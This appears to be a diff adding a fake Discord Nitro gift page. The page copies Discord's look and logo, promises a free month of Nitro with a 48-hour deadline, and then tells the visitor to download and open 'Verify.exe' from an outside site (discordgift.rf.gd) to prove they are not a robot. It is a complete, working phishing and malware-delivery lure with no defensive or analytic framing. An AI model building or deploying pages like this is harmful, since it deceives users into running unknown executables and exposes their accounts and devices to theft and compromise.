@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Discord Nitro Gift</title>
+  <link rel="icon" type="image/png" href="https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxsG72wAo9EWJR4yQWyJJaDb6rYcBtJvTvH3UoAS4JFNDaxGhmKNaMwgElLURlRFeVkLCjkfnXmWtINWZIrPGYq0-&format=source">
+  <style>
+    body {
+      background-color: #36393f;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      overflow: hidden;
+    }
+    
+    .container {
+      max-width: 400px;
+      margin: 100px auto;
+      padding: 20px;
+      background-color: #2f3136;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    }
+    
+    h1 {
+      font-size: 24px;
+    }
+    
+    p {
+      margin-bottom: 20px;
+    }
+    
+    .button {
+      display: inline-block;
+      padding: 10px 20px;
+      background-color: #7289da;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      text-decoration: none;
+      border-radius: 4px;
+      transition: background-color 0.3s ease;
+    }
+    
+    .button:hover {
+      background-color: #677bc4;
+    }
+    
+    .logo {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      z-index: 9999;
+    }
+
+    .menu {
+      margin-top: 20px;
+      display: none;
+    }
+    
+    .menu p {
+      margin-bottom: 10px;
+    }
+    
+    .menu .button {
+      margin-right: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">
+    <a href="https://discord.com" target="_blank">
+      <img src="https://upload.wikimedia.org/wikipedia/ru/thumb/b/b7/Discord_logo_svg.svg/1200px-Discord_logo_svg.svg.png" alt="Discord Logo" width="150" height="auto">
+    </a>
+  </div>
+
+  <div class="container">
+    <h1>NitroAdmin has gifted you Nitro for 1 month!</h1>
+    <p>Expires in 48 hours.</p>
+    <a class="button" href="#" onclick="showMenu()">Woo, Accept gift!</a>
+    <div class="menu" id="menu">
+      <p>Please download and open "Verify.exe" file to confirm that you're not a robot.</p>
+      <button class="button" onclick="openVerificationSite()">Download</button>
+    </div>
+  </div>
+
+  <script>
+    function openVerificationSite() {
+      window.location.href = "http://discordgift.rf.gd/verification-token-MTE4MDIzOTY0MDM2MDQwMjk2NA==";
+    }
+
+    function showMenu() {
+      var menu = document.getElementById("menu");
+      menu.style.display = "block";
+    }
+  </script>
+</body>
+</html>
